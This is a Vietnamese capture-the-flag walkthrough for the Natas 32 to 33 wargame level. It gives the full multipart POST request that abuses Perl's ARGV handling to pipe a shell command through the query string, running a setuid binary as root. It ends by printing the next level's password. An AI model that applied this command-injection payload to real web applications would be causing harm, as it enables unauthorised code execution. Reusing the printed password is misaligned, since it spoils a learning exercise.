# Natas 32 → 33

## Mục tiêu

Chạy binary có setuid trong webroot để lấy password Natas 33.

## Tôi thấy

Natas 32 dùng cùng CSV2HTML và Perl `ARGV` injection như level trước. `ls -al /var/www/natas/natas32` qua pipe cho thấy binary `getpassword` thuộc root và có setuid bit.

## Cách làm

Gửi hai trường multipart `file`: trường đầu `ARGV`, trường thứ hai CSV tùy ý. Đưa binary vào pipe trong query string:

```text
POST /index.pl?%2Fvar%2Fwww%2Fnatas%2Fnatas32%2Fgetpassword%20%7C

file=ARGV
file=@x.csv
```

CSV dùng trong lần xác minh:

```csv
h1,h2
a,b
```

## Vì sao cách này hiệu quả

Giá trị đầu `file=ARGV` làm diamond operator đọc đối số Perl, query string tạo lệnh pipe, còn setuid binary chạy với quyền root và in password của level kế tiếp.

## Kết quả

Binary trả `kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL`. Đã xác thực Basic Auth thành công tại Natas 33.

